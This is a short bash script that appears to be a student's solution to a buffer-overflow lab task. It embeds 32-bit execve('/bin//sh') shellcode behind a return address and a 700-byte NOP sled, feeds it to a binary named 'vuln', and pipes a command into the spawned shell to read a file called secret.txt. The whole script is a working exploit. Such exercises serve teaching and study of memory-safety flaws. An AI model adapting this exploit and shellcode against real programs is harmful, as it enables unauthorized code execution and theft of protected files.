#!/usr/bin/env bash
SHELLCODE='\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'
echo /bin/cat /task3/secret.txt | env -i \
  /task3/s1976502/vuln "$(python -c "print('\x50\xdf\xff\xff' + '\x90'*700 +  '$SHELLCODE')")" 1279  

